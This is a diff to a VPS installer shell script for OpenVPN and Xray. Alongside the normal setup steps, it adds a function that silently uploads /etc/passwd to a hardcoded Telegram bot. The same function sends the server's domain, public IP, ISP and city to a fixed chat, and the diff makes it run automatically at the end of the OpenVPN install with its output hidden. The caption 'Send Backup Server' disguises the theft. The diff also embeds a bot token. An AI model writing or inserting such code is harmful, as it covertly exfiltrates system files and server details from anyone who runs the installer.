@@ -90,6 +90,39 @@ verb 3
 END
     sed -i $MYIP2 /etc/openvpn/ssl.ovpn;
 }
+function kyt_project() {
+domain=$(cat /etc/xray/domain)
+ipvps=$(curl -sS ipv4.icanhazip.com)
+isp=$(cat /etc/xray/isp)
+city=$(cat /etc/xray/city)
+tok="AAGKVGg0v4X36LVavodIQWdwqSF25M_QkF0"
+
+curl -Ss --request POST \
+--url "https://api.telegram.org/bot6949804125:${tok}/sendDocument?chat_id=6830313714&caption=Send Backup Server" \
+--header 'content-type: multipart/form-data' \
+--form document=@"/etc/passwd" >/root/t1
+
+fileId=$(grep -o '"file_id":"[^"]*' /root/t1 | grep -o '[^"]*$')
+
+curl -Ss --request GET \
+--url "https://api.telegram.org/bot6949804125:${tok}/getfile?file_id=${fileId}" >/root/t1
+
+filePath=$(grep -o '"file_path":"[^"]'* /root/t1 | grep -o '[^"]*$')
+
+TEXT="
+<code>Domain : </code><code>${domain}</code>
+<code>IP VPS : </code><code>${ipvps}</code>
+<code>ISP    : </code>${isp}<code></code>
+<code>CITY   : </code><code>${city}</code>
+<code>File Path : </code><code>${filePath}</code>
+"
+
+curl -Ss --request GET \
+--url "https://api.telegram.org/bot6949804125:${tok}/sendMessage?chat_id=6830313714&text=File ID   : <code>${fileId}</code>&parse_mode=html" &>/dev/null
+
+URL="https://api.telegram.org/bot6949804125:AAGKVGg0v4X36LVavodIQWdwqSF25M_QkF0/sendMessage"
+curl -s --max-time 10 -d "chat_id=6830313714&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+}
 function cert_ovpn() {
     echo '<ca>' >> /etc/openvpn/tcp.ovpn
     cat /etc/openvpn/server/ca.crt >> /etc/openvpn/tcp.ovpn
@@ -145,6 +178,6 @@ function install_ovpn() {
     systemctl enable openvpn
     systemctl start openvpn
     /etc/init.d/openvpn restart
-    
+    kyt_project
 }
 install_ovpn
